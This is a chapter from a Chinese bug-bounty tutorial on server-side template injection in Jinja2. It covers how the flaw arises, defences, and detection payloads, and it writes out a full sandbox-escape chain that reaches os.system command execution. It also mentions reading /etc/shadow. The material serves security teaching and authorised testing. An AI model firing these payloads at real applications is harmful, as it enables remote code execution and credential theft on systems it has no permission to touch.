# 第16章：模板注入（Template Injection）

模板引擎是一种用于确定网页外观的软件。开发人员经常忽视针对这些引擎的攻击——称为服务器端模板注入（SSTI）——然而它们可能导致严重后果，如远程代码执行。在过去几年中，它们变得越来越常见，在Uber和Shopify等组织的应用程序中都曾发现实例。

在本章中，我们将通过聚焦使用Jinja2模板引擎的Web应用程序来深入探讨此漏洞的机制。在确认我们可以向应用程序提交模板注入后，我们将利用Python沙箱逃逸技巧在服务器上运行操作系统命令。

利用不同的模板引擎需要不同的语法和方法，但本章应为你提供一个良好的入门介绍，介绍在任何系统上发现和利用模板注入漏洞时有用的原则。

## 机制

要理解模板注入的工作原理，你需要了解它们所针对的模板引擎的机制。简而言之，模板引擎将应用程序数据与Web模板结合起来生成网页。这些Web模板使用如Jinja等模板语言编写，为开发人员提供了一种指定页面应如何渲染的方式。Web模板和模板引擎一起，允许开发人员在Web开发过程中分离服务器端应用程序逻辑和客户端展示代码。

### 模板引擎

让我们看一下Jinja，这是一种Python的模板语言。以下是一个用Jinja编写的模板文件，我们将其保存为`example.jinja`：

```jinja
<html>
<body>
① <h1>{{ list_title }}</h1>
<h2>{{ list_description }}</h2>
② {% for item in item_list %}
  {{ item }}
  {% if not loop.last %},{% endif %}
{% endfor %}
</body>
</html>
```

如你所见，此模板文件看起来像普通的HTML。然而，它包含特殊语法来指示模板引擎应解释为模板代码的内容。在Jinja中，双花括号`{{ }}`内的任何代码将被解释为Python表达式，而括号和百分号配对`{% %}`内的代码应被解释为Python语句。

在编程语言中，**表达式**是变量或返回值的函数，而**语句**是不返回任何内容的代码。在这里，你可以看到模板首先在HTML标题标签中嵌入表达式`list_title`和`list_description`①。然后它创建一个循环，在HTML正文中渲染`item_list`变量中的所有项目②。

现在开发人员可以将模板与Python代码结合以创建完整的HTML页面。以下Python代码从`example.jinja`读取模板文件，并通过向模板引擎提供要插入模板的值来动态生成HTML页面：

```python
from jinja2 import Template

with open('example.jinja') as f: ①
    tmpl = Template(f.read())

print(tmpl.render( ②
    list_title = ③ "Chapter Contents",
    list_description = ④ "Here are the contents of chapter 16.",
    item_list = ⑤ ["Mechanisms Of Template Injection", "Preventing Template Injection",
                  "Hunting For Template Injection", 
                  "Escalating Template Injection", "Automating Template Injection", "Find Your First Template Injection!"]
))
```

首先，Python代码读取名为`example.jinja`的模板文件①。然后它通过向模板提供所需值来动态生成HTML页面②。你可以看到代码正在使用值`Chapter Contents`作为`list_title`③，`Here are the contents of chapter 16.`作为`list_description`④，以及一个值列表——`Mechanisms Of Template Injection`、`Preventing Template Injection`、`Hunting For Template Injection`、`Escalating Template Injection`、`Automating Template Injection`和`Find Your First Template Injection!`——作为`item_list`⑤来渲染模板。

模板引擎将结合Python脚本中提供的数据和模板文件`example.jinja`来创建此HTML页面：

```html
<html>
<body>
<h1>Chapter Contents</h1>
<h2>Here are the contents of chapter 16.</h2>
Mechanisms Of Template Injection,
Preventing Template Injection,
Hunting For Template Injection,
Escalating Template Injection,
Automating Template Injection,
Find Your First Template Injection!
</body>
</html>
```

模板引擎使渲染网页更加高效，因为开发人员可以通过重用模板以标准化方式呈现不同数据集。当开发人员需要生成具有自定义内容的相同格式页面时，此功能尤其有用，例如批量电子邮件、在线市场上的单个商品页面以及不同用户的个人资料页面。分离HTML代码和应用程序逻辑也使开发人员更容易修改和维护HTML代码的部分。

市场上流行的模板引擎包括Jinja、Django和Mako（用于Python）、Smarty和Twig（用于PHP），以及Apache FreeMarker和Apache Velocity（用于Java）。我们将在本章后面讨论如何在应用程序中识别这些模板引擎。

### 注入模板代码

当用户能够在未经适当清理的情况下将输入注入模板时，就会发生模板注入漏洞。我们之前的示例不易受模板注入漏洞攻击，因为它不将用户输入嵌入模板中。它只是将硬编码值列表作为`list_title`、`list_description`和`item_list`传递到模板中。即使前面的Python代码片段像这样将用户输入传递到模板中，代码也不会容易受到模板注入攻击，因为它安全地将用户输入作为数据传递到模板中：

```python
from jinja2 import Template

with open('example.jinja') as f:
    tmpl = Template(f.read())

print(tmpl.render(
    ① list_title = user_input.title,
    ② list_description = user_input.description,
    ③ item_list = user_input.list,
))
```

如你所见，代码清楚地定义了`user_input`的标题部分只能用作`list_title`①，`user_input`的描述部分是`list_description`②，`user_input`的列表部分可用于模板的`item_list`③。

然而，有时开发人员将模板视为编程语言中的字符串，直接将用户输入拼接到其中。这就是问题所在，因为模板引擎将无法区分用户输入和开发人员的模板代码。

以下是一个示例。以下程序接受用户输入并将其插入Jinja模板中，以在HTML页面上显示用户的姓名：

```python
from jinja2 import Template

tmpl = Template("
<html><h1>The user's name is: " + user_input + "</h1></html>")①
print(tmpl.render())②
```

代码首先通过将HTML代码和用户输入拼接在一起来创建模板①，然后渲染模板②。

如果用户向该页面提交GET请求，网站将返回显示其姓名的HTML页面：

```
GET /display_name?name=Vickie
Host: example.com
```

此请求将导致模板引擎渲染以下页面：

```html
<html>
<h1>The user's name is: Vickie</h1>
</html>
```

现在，如果你提交如下载荷会怎样？

```
GET /display_name?name={{1+1}}
Host: example.com
```

你不是提供姓名作为`name`参数，而是提交了一个对模板引擎具有特殊含义的表达式。Jinja2将双花括号`{{ }}`内的任何内容解释为Python代码。你会注意到生成的HTML页面中有些奇怪。页面没有显示字符串`The user's name is: {{1+1}}`，而是显示字符串`The user's name is: 2`：

```html
<html>
<h1>The user's name is: 2</h1>
</html>
```

发生了什么？当你提交`{{1+1}}`作为你的姓名时，模板引擎误将`{{ }}`内的内容当作Python表达式，因此它执行了`1+1`并在该字段中返回了数字2。

这意味着你可以提交任何你想要的Python代码并在HTML页面中获得其结果。例如，`upper()`是Python中将字符串转换为大写的方法。尝试提交代码片段`{{'Vickie'.upper()}}`，如下所示：

```
GET /display_name?name={{'Vickie'.upper()}}
Host: example.com
```

你应该会看到返回了这样的HTML页面：

```html
<html>
<h1>The user's name is: VICKIE</h1>
</html>
```

你可能已经注意到模板注入与SQL注入类似。如果模板引擎无法确定用户提供的数据在哪里结束、模板逻辑在哪里开始，模板引擎就会将用户输入误认为是模板代码。在这种情况下，攻击者可以提交任意代码并让模板引擎将其输入作为源代码执行！

根据被入侵应用程序的权限，攻击者可能能够使用模板注入漏洞读取敏感文件或提升其在系统上的权限。我们将在本章后面讨论更多关于提升模板注入的内容。

## 防御措施

如何防止这种危险的漏洞？第一种方法是定期修补和更新应用程序使用的框架和模板库。许多开发人员和安全专业人员正在意识到模板注入的危险。因此，模板引擎发布了针对此攻击的各种缓解措施。不断将软件更新到最新版本将确保你的应用程序免受新攻击向量的侵害。

如果可能，你还应防止用户提供用户提交的模板。如果这不是一个选项，许多模板引擎提供加固的沙箱环境，你可以使用它来安全地处理用户输入。这些沙箱环境移除潜在危险的模块和函数，使用户提交的模板评估更安全。然而，研究人员已经发表了大量沙箱逃逸漏洞，因此这绝不是一种万无一失的方法。沙箱环境也仅与其配置一样安全。

为模板中的允许属性实施白名单，以防止本章中将介绍的RCE漏洞类型。此外，有时模板引擎会抛出描述性错误，帮助攻击者开发漏洞利用。你应该正确处理这些错误，并向用户返回通用错误页面。最后，在将用户输入嵌入Web模板之前对其进行清理，并尽可能避免将用户提供的数据注入模板。

## 寻找模板注入

与寻找许多其他漏洞一样，发现模板注入的第一步是识别应用程序中接受用户输入的位置。

### 第1步：寻找用户输入位置

寻找你可以向应用程序提交用户输入的位置。这些包括URL路径、参数、片段、HTTP请求头和请求体、文件上传等。

模板通常用于根据存储的数据或用户输入动态生成网页。例如，应用程序经常使用模板引擎根据用户信息生成自定义电子邮件或首页。因此，要寻找模板注入，寻找接受最终将显示回给用户的用户输入的端点。由于这些端点通常与可能进行XXS攻击的端点重合，你可以使用第6章概述的策略来识别模板注入的候选者。记录这些输入位置以供进一步测试。

### 第2步：通过提交测试载荷来检测模板注入

接下来，通过向你在上一步中识别的输入字段注入测试字符串来检测模板注入漏洞。此测试字符串应包含模板语言中常用的特殊字符。我喜欢使用字符串`{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]`，因为它旨在在流行的模板引擎中诱导错误。`${...}`是FreeMarker和Thymeleaf Java模板中表达式的特殊语法；`{{...}}`是PHP模板（如Smarty或Twig）和Python模板（如Jinja2）中表达式的语法；`<%= ... %>`是嵌入式Ruby模板（ERB）的语法。而`[random expression]`将使服务器将随机表达式解释为列表项（如果用户输入被放置在模板中的表达式标签内，我们稍后将讨论这种情况的一个示例）。

在此载荷中，我让模板引擎解析名为`abcxx`的变量，该变量可能在应用程序中尚未定义。如果你从此载荷中获得应用程序错误，这是模板注入的一个良好指示，因为这意味着特殊字符正被模板引擎视为特殊字符。但如果服务器上抑制了错误消息，你需要使用另一种方法来检测模板注入漏洞。

尝试向输入字段提供这些测试载荷：`${7*7}`、`{{7*7}}`和`<%= 7*7 %>`。这些载荷旨在检测各种模板语言中的模板注入。`${7*7}`适用于FreeMarker和Thymeleaf Java模板；`{{7*7}}`适用于PHP模板（如Smarty或Twig）和Python模板（如Jinja2）；`<%= 7*7 %>`适用于ERB模板。

如果任何返回的响应包含表达式的结果`49`，这意味着数据正被模板引擎解释为代码：

```
GET /display_name?name={{7*7}}
Host: example.com
```

在测试这些端点是否存在模板注入时，请记住成功的载荷并不总是立即导致结果返回。某些应用程序可能将你的载荷插入到其他位置的模板中。你的注入结果可能出现在未来的网页、电子邮件和文件中。载荷提交与用户输入在模板中渲染之间也可能存在时间延迟。如果你针对的是这些端点之一，你需要留意你的载荷成功的迹象。例如，如果应用程序在生成批量电子邮件时不安全地渲染输入字段，你将需要查看生成的电子邮件以检查攻击是否成功。

当用户输入作为纯文本插入模板时，三个测试载荷`${7*7}`、`{{7*7}}`和`<%= 7*7 %>`将起作用，如以下代码片段所示：

```python
from jinja2 import Template

tmpl = Template("
<html><h1>The user's name is: " + user_input + "</h1></html>")
print(tmpl.render())
```

但如果用户输入作为模板逻辑的一部分拼接到模板中，如以下代码片段所示呢？

```python
from jinja2 import Template

tmpl = Template("
<html><h1>The user's name is: {{" + user_input + "}}</h1></html>")
print(tmpl.render())
```

在这里，用户输入被放置在模板中的表达式标签`{{...}}`内。因此，你无需为服务器提供额外的表达式标签来将输入解释为代码。在这种情况下，检测你的输入是否被解释为代码的最佳方法是提交一个随机表达式，看看它是否被解释为表达式。在这种情况下，你可以向该字段输入`7*7`，看看是否返回`49`：

```
GET /display_name?name=7*7
Host: example.com
```

### 第3步：确定正在使用的模板引擎

一旦确认了模板注入漏洞，确定正在使用的模板引擎，以找出最佳利用该漏洞的方法。要提升攻击，你将不得不使用特定模板引擎期望的编程语言编写载荷。

如果你的载荷引起了错误，错误消息本身可能包含模板引擎的名称。例如，将我的测试字符串`{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]`提交到我们的示例Python应用程序将导致一个描述性错误，告诉我应用程序正在使用Jinja2：

```
jinja2.exceptions.UndefinedError: 'abcxx' is undefined
```

否则，你可以通过提交特定于流行模板语言的测试载荷来确定正在使用的模板引擎。例如，如果你提交`<%= 7*7 %>`作为载荷并返回`49`，应用程序可能使用ERB模板。如果成功的载荷是`${7*7}`，模板引擎可能是Smarty或Mako。如果成功的载荷是`{{7*7}}`，应用程序可能使用Jinja2或Twig。此时，你可以提交另一个载荷`{{7*'7'}}`，它在Jinja2中返回`7777777`，在Twig中返回`49`。这些测试载荷取自PortSwigger研究：https://portswigger.net/research/server-side-template-injection/。

除了我讨论的那些之外，Web应用程序还使用许多其他模板引擎。许多具有旨在不干扰正常HTML语法的类似特殊字符，因此你可能需要执行多个测试载荷才能明确确定你正在攻击的模板引擎类型。

## 提升攻击影响

一旦确定了正在使用的模板引擎，你就可以开始提升你发现的漏洞的影响。大多数时候，你可以简单地使用上一节介绍的`7*7`载荷来向安全团队证明模板注入。但如果你能展示模板注入可用于完成比简单数学运算更多的事情，你就可以证明漏洞的影响并向安全团队展示其价值。

你提升攻击的方法将取决于你正在攻击的模板引擎。要了解更多信息，请阅读模板引擎及其附带编程语言的官方文档。在这里，我将展示如何在运行Jinja2的应用程序中将模板注入漏洞提升为系统命令执行。

能够执行系统命令对攻击者来说非常有价值，因为它可能允许他们读取敏感系统文件（如客户数据和源代码文件）、更新系统配置、提升系统权限以及攻击网络上的其他机器。例如，如果攻击者可以在Linux机器上执行任意系统命令，他们可以通过执行命令`cat /etc/shadow`读取系统的密码文件。然后他们可以使用密码破解工具破解系统管理员的加密密码并获得管理员账户的访问权限。

### 通过Python代码搜索系统访问

让我们回到我们的示例应用程序。我们已经知道你可以通过此模板注入漏洞执行Python代码。但如何通过注入Python代码来执行系统命令呢？

```python
from jinja2 import Template

tmpl = Template("
<html><h1>The user's name is: " + user_input + "</h1></html>")
print(tmpl.render())
```

通常在Python中，你可以通过`os`模块的`os.system()`函数执行系统命令。例如，以下Python代码将执行Linux系统命令`ls`以显示当前目录的内容：

```python
os.system('ls')
```

然而，如果你将此载荷提交到我们的示例应用程序，你很可能不会得到预期的结果：

```
GET /display_name?name={{os.system('ls')}}
Host: example.com
```

相反，你可能会遇到应用程序错误：

```
jinja2.exceptions.UndefinedError: 'os' is undefined
```

这是因为`os`模块在模板环境中不被识别。默认情况下，它不包含像`os`这样的危险模块。通常，你可以使用语法`import MODULE`或`from MODULE import *`，或最后`__import__('MODULE')`来导入Python模块。让我们尝试导入`os`模块：

```
GET /display_name?name="{{__import__('os').system('ls')}}"
Host: example.com
```

如果你将此载荷提交到应用程序，你可能会看到返回另一个错误：

```
jinja2.exceptions.UndefinedError: '__import__' is undefined
```

这是因为你无法在Jinja模板中导入模块。大多数模板引擎将阻止使用危险功能（如`import`）或制作一个白名单，只允许用户在模板内执行某些操作。为了绕过Jinja2的这些限制，你需要利用Python沙箱逃逸技术。

### 使用Python内置函数逃逸沙箱

其中一种技术涉及使用Python的内置函数。当你被禁止导入某些有用的模块或根本不能导入任何东西时，你需要研究Python默认已导入的函数。许多这些内置函数作为Python的`object`类的一部分集成，这意味着当我们要调用这些函数时，我们可以创建一个对象并将该函数作为该对象的方法调用。

例如，以下GET请求包含列出可用Python类的Python代码：

```
GET /display_name?name="{{[].__class__.__bases__[0].__subclasses__()}}"
Host: example.com
```

当你将此载荷提交到模板注入端点时，你应该会看到类似这样的类列表：

```
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reverse keyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitem iterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memory view'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>...]
```

为了更好地理解这里发生了什么，让我们稍微分解一下这个载荷：

```python
[].__class__.__bases__[0].__subclasses__()
```

它首先创建一个空列表并调用其`__class__`属性，该属性指向实例所属的类`list`：

```python
[].__class__
```

然后你可以使用`__bases__`属性来指向`list`类的基类：

```python
[].__class__.__bases__
```

此属性将返回`list`类的所有基类的元组（在Python中只是一个有序列表）。基类是当前类构建自的类；`list`有一个名为`object`的基类。接下来，我们需要通过引用元组中的第一项来访问`object`类：

```python
[].__class__.__bases__[0]
```

最后，我们使用`__subclasses__()`来引用该类的所有子类：

```python
[].__class__.__bases__[0].__subclasses__()
```

当我们使用此方法时，`object`类的所有子类都变得可访问！现在，我们只需在这些类中寻找一个可用于命令执行的方法。让我们探索一种可能的代码执行方式。在继续之前，请记住并非每个应用程序的Python环境都具有相同的类。而且，我接下来要讲的载荷可能不适用于所有目标应用程序。

可用于导入模块的`__import__`函数是Python的内置函数之一。但由于Jinja2阻止直接访问它，你将需要通过`builtins`模块访问它。此模块提供对Python所有内置类和函数的直接访问。大多数Python模块都有`__builtins__`作为指向内置模块的属性，因此你可以通过引用`__builtins__`属性来恢复`builtins`模块。

在`[].__class__.__bases__[0].__subclasses__()`中的所有子类中，有一个名为`catch_warnings`的类。这是我们将用来构造利用的子类。要找到`catch_warnings`子类，向模板代码注入一个循环来查找它：

```jinja
① {% for x in [].__class__.__bases__[0].__subclasses__() %}
②   {% if 'catch_warnings' in x.__name__ %}
③     {{ x() }}
    {%endif%}
{%endfor%}
```

此循环遍历`[].__class__.__bases__[0].__subclasses__()`中的所有类①，并找到名称中包含字符串`catch_warnings`的那个②。然后它实例化该类的一个对象③。`catch_warnings`类的对象有一个名为`_module`的属性，指向`warnings`模块。

最后，我们使用对模块的引用来引用`builtins`模块：

```jinja
{% for x in [].__class__.__bases__[0].__subclasses__() %}
  {% if 'catch_warnings' in x.__name__ %}
    {{ x()._module.__builtins__ }}
  {%endif%}
{%endfor%}
```

你应该会看到返回的内置类和函数列表，包括`__import__`函数：

```
{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the 'nil' object; Ellipsis represents '...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, ...}
```

我们现在有了一种访问`import`功能的方法！由于内置类和函数存储在Python字典中，你可以通过引用函数条目在字典中的键来访问`__import__`函数：

```jinja
{% for x in [].__class__.__bases__[0].__subclasses__() %}
  {% if 'catch_warnings' in x.__name__ %}
    {{ x()._module.__builtins__['__import__'] }}
  {%endif%}
{%endfor%}
```

现在我们可以使用`__import__`函数来导入`os`模块。你可以通过提供模块名称作为参数来使用`__import__`导入模块。在这里，让我们导入`os`模块以便我们可以访问`system()`函数：

```jinja
{% for x in [].__class__.__bases__[0].__subclasses__() %}
  {% if 'catch_warnings' in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os') }}
  {%endif%}
{%endfor%}
```

最后，调用`system()`函数并将我们想要执行的命令作为`system()`函数的参数：

```jinja
{% for x in [].__class__.__bases__[0].__subclasses__() %}
  {% if 'catch_warnings' in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').system('ls') }}
  {%endif%}
{%endfor%}
```

你应该会看到`ls`命令的结果返回。此命令列出当前目录的内容。你已经实现了命令执行！现在，你应该能够使用此模板注入执行任意系统命令。

### 提交载荷进行测试

出于测试目的，你应该执行不会损害目标系统的代码。证明你已实现命令执行并获得操作系统访问权限的常见方法是在系统上创建一个具有唯一文件名的文件，例如`template_injection_by_YOUR_BUG_BOUNTY_USERNAME.txt`，以便该文件明确是你概念验证的一部分。使用`touch`命令在当前目录中创建具有指定名称的文件：

```jinja
{% for x in [].__class__.__bases__[0].__subclasses__() %}
  {% if 'warning' in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').system('touch template_injection_by_vickie.txt') }}
  {%endif%}
{%endfor%}
```

不同的模板引擎需要不同的提升技术。如果探索此领域让你感兴趣，我鼓励你对此领域进行更多研究。代码执行和沙箱逃逸确实是令人着迷的主题。

我们将在第18章讨论更多关于如何在目标系统上执行任意代码的内容。如果你有兴趣了解更多关于沙箱逃逸的知识，这些文章更详细地讨论了该主题（本章的示例是根据Programmer Help的一个提示开发的）：

- CTF Wiki，https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/
- HackTricks，https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes/
- Programmer Help，https://programmer.help/blogs/python-sandbox-escape.html

## 自动化模板注入

为每个目标系统开发漏洞利用可能很耗时。幸运的是，模板通常包含其他人已发现的已知漏洞利用，因此当你发现模板注入漏洞时，自动化利用过程以提高效率是个好主意。

一个为自动化模板注入过程而构建的工具，称为tplmap（https://github.com/epinna/tplmap），可以扫描模板注入、确定正在使用的模板引擎并构造漏洞利用。虽然此工具不支持每个模板引擎，但它应该为你提供最流行引擎的良好起点。

## 找到你的第一个模板注入！

是按照我们本章讨论的步骤找到你的第一个模板注入漏洞的时候了：

1. **识别向应用程序提交用户输入的任何机会**。标记模板注入的候选者以供进一步检查。
2. **通过提交测试载荷来检测模板注入**。你可以使用设计用于诱导错误的载荷，或设计用于被模板引擎评估的引擎特定载荷。
3. **如果找到易受模板注入攻击的端点**，确定正在使用的模板引擎。这将帮助你构建特定于该模板引擎的漏洞利用。
4. **研究目标正在使用的模板引擎和编程语言**以构建漏洞利用。
5. **尝试将漏洞提升为任意命令执行**。
6. **创建一个不会损害目标系统的概念验证**。一个好方法是执行`touch template_injection_by_YOUR_NAME.txt`以创建一个特定的概念验证文件。
7. **起草你的第一份模板注入报告并发送给组织！**